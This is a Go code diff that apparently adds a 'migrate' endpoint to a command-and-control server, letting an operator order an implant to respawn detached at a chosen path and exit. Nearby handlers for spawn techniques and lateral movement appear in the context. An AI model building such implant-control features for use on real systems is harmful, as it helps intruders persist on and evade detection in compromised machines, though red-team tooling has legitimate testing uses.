@@ -737,6 +737,34 @@ func (s *Server) handleSpawn(c *gin.Context) {
 	s.dispatchTask(c, task, "spawn", fmt.Sprintf("%s|%s", target, technique))
 }
 
+// handleMigrate relocates the implant into a fresh process context: a copy of
+// the agent is spawned detached at an optional operator-supplied path (default:
+// platform-appropriate temp location) and the current instance exits.
+func (s *Server) handleMigrate(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	id := c.Param("id")
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+
+	path := c.PostForm("path")
+	if err := validateCommandArg(path, MaxTargetLength, "path"); err != nil {
+		respondError(c, http.StatusBadRequest, err.Error())
+		return
+	}
+
+	task, err := s.createTask(id, "migrate", path, "", "", "", 0, 0)
+	if err != nil {
+		respondError(c, http.StatusInternalServerError, "failed to create task")
+		return
+	}
+	slog.Info("Migrate requested", "agent_id", id, "path", path)
+	s.LogAuditRecord(c, "migrate", "agent", id, fmt.Sprintf("Process migration requested (path=%q)", path), true, nil)
+	s.dispatchTask(c, task, "migrate", path)
+}
+
 func (s *Server) handleLateral(c *gin.Context) {
 	if !s.requireOperator(c) {
 		return
